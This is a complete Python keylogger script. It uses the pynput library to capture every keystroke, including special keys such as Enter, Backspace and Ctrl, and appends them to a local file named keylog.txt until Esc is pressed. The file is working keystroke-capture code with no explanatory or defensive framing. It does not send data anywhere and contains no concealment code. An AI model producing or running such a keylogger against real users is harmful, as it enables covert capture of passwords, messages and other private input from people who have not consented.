from pynput import keyboard
import os

# File to save the logged keys
log_file = "keylog.txt"

# Ensure the file exists
if not os.path.exists(log_file):
    with open(log_file, "w") as file:
        file.write("Keylogger started\n")

# Function to log the key pressed
def on_press(key):
    try:
        # Log regular keys
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Log special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as file:
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            elif key == keyboard.Key.tab:
                file.write("[TAB]")
            elif key == keyboard.Key.shift:
                file.write("[SHIFT]")
            elif key == keyboard.Key.ctrl:
                file.write("[CTRL]")
            elif key == keyboard.Key.alt:
                file.write("[ALT]")
            else:
                file.write(f"[{key.name.upper()}]")

# Function to stop the keylogger (if needed)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener by returning False
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()